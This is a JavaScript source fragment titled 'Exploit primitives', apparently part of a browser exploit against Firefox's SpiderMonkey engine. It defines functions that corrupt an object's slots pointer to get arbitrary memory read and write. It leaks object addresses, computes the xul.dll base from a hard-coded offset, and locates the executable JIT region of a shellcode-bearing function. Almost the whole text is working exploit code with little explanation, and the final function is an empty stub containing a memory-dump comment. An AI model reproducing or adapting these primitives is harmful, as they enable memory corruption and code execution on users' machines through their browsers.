/*//////
////////
// Exploit primitives
///////*/

function WeakLeakDbl(TargetAddress) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    var LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] + 4;
    SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    var LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    SetSlotsPtr(SavedSlotsPtrDbl);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

var ExplicitDwordArray = new Uint32Array(1); // Used for the strong write
var ExplicitDwordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitDblArray = new Float64Array(1); // Used for the strong read
var ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var LeakedXulAddress = null;

function InitStrongRWPrimitive() {
	// Leak data view pointers from the ExplicitDwordArray and ExplicitDwordArray ArrayBuffer struct
	
    LeakedXulAddress = HelperDbl[0] = WeakLeakObjectAddress(ExplicitDblArray);
	//DebugLog("Float64Array NativeObject: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    HelperDword[0] = HelperDword[0] + 0x38; // Float64Array data view pointer (same as ArrayBuffer)
    ExplicitDblArrayDataPtr = HelperDbl[0];
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDwordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint32Array data view pointer (same as ArrayBuffer)
    ExplicitDwordArrayDataPtr = HelperDbl[0];
	
	// Leak the default/initial value of the Float64Array NativeObject.ElementPtr to obtain address within xul.dll
	
	HelperDbl[0] = LeakedXulAddress;
	HelperDword[0] = HelperDword[0] + 0x18; // Element pointer will initially hold an address within xul.dll
	LeakedXulAddress = HelperDbl[0];
    HelperDbl[0] = LeakedXulAddress = WeakLeakDbl(LeakedXulAddress);
	// 0x45C1BB0 delta
	HelperDword[0] = HelperDword[0] - 0x45C1BB0;
	LeakedXulAddress = HelperDbl[0];
	//DebugLog("Leaked xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
}

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

function StrongWriteDword(TargetAddress, Value) {
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    ExplicitDwordArray[0] = Value;
}

function GetJSFuncJITInfoPtr(JSFuncObj) {
    HelperDbl[0] = WeakLeakObjectAddress(JSFuncObj); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    var JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    HelperDbl[0] = JITInfoAddress;
    
    if(HelperDword[0] == 0x41414141) {
        //DebugLog("Arbitrary read primitive failed");
        window.location.reload();
        return 0.0;
    }
    
    return JITInfoAddress;
}

function GetJSFuncJITCodePtr(JSFuncObj) {
    var JITInfoAddress = GetJSFuncJITInfoPtr(JSFuncObj);
    
    if(JITInfoAddress) {
        var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        return JITCodePtr;
    }
    
    return 0.0;
}

function LeakXulBase() {
	/*
	Float64Array NativeObject
	
	struct NativeObject {
		void *GroupPtr;
		void *ShapePtr;
		void *SlotsPtr;
		void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
	}

	0000029E4C834290  0000029E4EDA9AC1  Á.ÚN....  <- Group pointer
	0000029E4C834298  0000029E4C831200  ...L....  
	0000029E4C8342A0  0000000000000000  ........  
	0000029E4C8342A8  00007FFAFB9B1BB0  °..ûú...  <- Element pointer (xul.dll base: 00007FFAF73F0000)
	
	
	*/
	
	
}